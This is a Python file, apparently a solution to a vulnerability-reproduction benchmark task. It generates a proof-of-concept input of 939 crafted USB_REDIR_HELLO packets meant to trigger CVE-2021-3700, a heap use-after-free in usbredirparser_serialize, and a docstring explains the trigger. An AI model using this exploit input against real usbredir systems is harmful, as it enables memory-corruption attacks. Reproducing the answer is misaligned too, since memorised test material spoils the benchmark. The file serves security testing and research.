import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability (CVE-2021-3700)
        in usbredirparser_serialize.

        The vulnerability exists in the `usbredirparser_serialize` function when handling 
        a large amount of buffered write data (specifically, when the pending write buffers 
        exceed the default serialization buffer size of 64KB). The serialization logic 
        reallocates the buffer but fails to update a pointer (`write_buf_count_pos`), 
        leading to a use-after-free when the write buffer count is subsequently written.

        To trigger this via a fuzzer input (which drives `usbredirparser_do_read`):
        1. We simulate the device sending data to the host.
        2. We utilize the `USB_REDIR_HELLO` packet (type 0). When the parser receives a 
           valid HELLO packet, it typically queues a HELLO response.
        3. Assuming the fuzzer harness simulates a blocked or slow write destination 
           (causing write buffers to accumulate), we flood the parser with valid HELLO packets.
        4. Each request (76 bytes) generates a response (~80+ bytes).
        5. To exceed the 64KB (65536 bytes) buffer limit, we need approximately 
           65536 / 80 ~= 820 packets.
        6. The ground truth PoC length is 71298 bytes, which corresponds to roughly 
           938 packets (938 * 76 = 71288). We will generate 939 packets to align 
           closely with this size and guarantee the buffer overflow triggers the realloc.
        """

        # Constants from usbredirproto.h
        USB_REDIR_HELLO = 0
        
        # Packet structure:
        # Header (12 bytes): type (4), length (4), id (4)
        # Payload: version string (64 bytes)
        # Total per packet: 76 bytes
        
        HDR_LEN = 12
        HELLO_PAYLOAD_LEN = 64
        
        # Number of packets to match approx 71KB and ensure > 64KB output buffer
        num_packets = 939
        
        poc = bytearray()
        
        for i in range(num_packets):
            # Construct Header
            # All fields are uint32_t, little-endian
            pkt_type = USB_REDIR_HELLO
            pkt_len = HELLO_PAYLOAD_LEN
            pkt_id = i + 1  # Sequential IDs
            
            header = struct.pack('<III', pkt_type, pkt_len, pkt_id)
            
            # Construct Payload
            # 64 bytes for version string (nulls are valid)
            body = b'\x00' * HELLO_PAYLOAD_LEN
            
            poc.extend(header)
            poc.extend(body)
            
        return bytes(poc)